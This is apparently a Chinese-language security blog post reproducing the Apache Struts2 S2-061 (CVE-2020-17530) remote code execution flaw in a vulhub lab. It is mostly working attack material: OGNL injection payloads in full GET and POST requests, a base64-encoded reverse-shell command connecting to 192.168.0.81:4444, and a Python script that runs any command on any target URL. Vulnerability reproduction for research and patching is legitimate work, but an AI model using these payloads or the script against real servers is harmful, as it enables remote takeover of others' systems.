---
title: strcuts2-061复现
tags:
  - 安全
  - 复现
categories:
  - 安全
copyright: true
permalink: strcuts2-061复现
top: 0
password: 
abstract: 输入密码继续阅读.
message: 欢迎来到我的博客，输入密码继续阅读.
date: 2020-12-13 21:09:05
---

Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架。Apache Struts于2020年12月08日披露 S2-061 Struts 远程代码执行漏洞，开发人员使用了 %{…} 语法，从而攻击者可以通过构Payload，从而造成远程代码执行。


<!--more-->
该漏洞编号为 CVE-2020-17530 ，漏洞等级：高危 ，漏洞评分：7.5

S2-061是对S2-059沙盒进行的绕过！



http://www.jackson-t.ca/runtime-exec-payloads.html


### 漏洞复现

docker环境地址：

项目地址：
```
https://github.com/vulhub/vulhub/tree/master/struts2/s2-061
```


### 漏洞利用



验证是否存在漏洞


```
%{ 'AJay' + (10 + 3).toString()}
```
url编码之后encodeURIComponent

```
%25%7B%20%27AJay%27%20%2B%20(10%20%2B%203).toString()%7D
```

如果能够计算，说明存在漏洞

![20201213133910](https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201213133910.png)

**get执行exp**


```
GET /?id=%25%7B(%27Powered_by_Unicode_Potats0%2Cenjoy_it%27).(%23UnicodeSec+%3D+%23application%5B%27org.apache.tomcat.InstanceManager%27%5D).(%23potats0%3D%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3D%23attr%5B%27struts.valueStack%27%5D).(%23potats0.setBean(%23stackvalue)).(%23context%3D%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3D%23potats0.get(%27memberAccess%27)).(%23emptySet%3D%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2C%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2C%23emptySet)).(%23exec%3D%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3D%7B%27ls%27%7D).(%23res%3D%23exec.exec(%23cmd))%7D HTTP/1.1
Host: xxxxxxx:8080
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=node0q527078386vpgx6z02bism1s1.node0
Connection: close


```

![20201213131012](https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201213131012.png)

**post执行exp**
```
POST /index.action HTTP/1.1
Host: 192.168.1.107:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Length: 827

------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name="id"

%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("ls")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
------WebKitFormBoundaryl7d1B1aGsV2wcZwF--

```


**反弹shell**
```
POST /index.action  HTTP/1.1
Host: 192.168.1.107:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Length: 949
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF

Content-Length: 827


------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name="id"


%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuODEvNDQ0NCAgMD4mMQ==}|{base64,-d}|{bash,-i}")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
```

![20201213132730](https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201213132730.png)



如果不能返回，可以使用base64下
http://www.jackson-t.ca/runtime-exec-payloads.html

![20201213133056](https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201213133056.png)



**脚本验证**

```
# encoding=utf-8
import requests
import sys
from lxml import etree




def exp(url,cmd):
    payload="%25%7b(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application%5b%27org.apache.tomcat.InstanceManager%27%5d).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr%5b%27struts.valueStack%27%5d).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d%7b%27"+cmd+"%27%7d).(%23res%3d%23exec.exec(%23cmd))%7d"
    tturl=url+"/?id="+payload
    r=requests.get(tturl)
    page=r.text
#   etree=html.etree
    page=etree.HTML(page)
    data = page.xpath('//a[@id]/@id')
    print(data[0])


if __name__=='__main__':
    print('+------------------------------------------------------------+')
    print('+ EXP: python struts2-061-poc.py http://8.8.8.8:8080 id      +')
    print('+ VER: Struts 2.0.0-2.5.25                                   +')
    print('+------------------------------------------------------------+')
    print('+ S2-061 RCE && CVE-2020-17530                               +')
    print('+------------------------------------------------------------+')
    if len(sys.argv)!=3:
        print("[+]ussage: http://ip:port command")
        print("[+]============================================================")
        sys.exit()
    url=sys.argv[1]
    cmd=sys.argv[2]
exp(url,cmd)

```

### 参考链接
https://mp.weixin.qq.com/s?__biz=MzAxNzkyOTgxMw==&mid=2247485269&idx=2&sn=44c0ef7230f2715fabe07620865db6dc&chksm=9bdf446faca8cd797b27154448a5edf2c7f1ef246f5534822a76537b2c0288d66f740f38da2c&scene=27&key=a807eef1e3c777ceb88567f45f0ba437dcbc2f7018dd8a74633d4ae819a5b89ae9dc2361b9290614cb1b22394f73065d6ca19a88be9266a66d162529b304fe347634ac99cbec43a99c42c8d6eae23d0524a56a7d9df1533542db731c7c5f77918e5e245ba0d092d5ea0fafd7f7126ecd1cf28330fc2626b1c1da47a6f593980d&ascene=0&uin=MjM2NjMzNTUwNA%3D%3D&devicetype=Windows+Server+2016+x64&version=6300002f&lang=zh_C
https://mp.weixin.qq.com/s?__biz=MzU2NDgzOTQzNw==&mid=2247486072&idx=1&sn=b7b1c04a72632ed5fd45bf2c59d51a11
http://www.jackson-t.ca/runtime-exec-payloads.html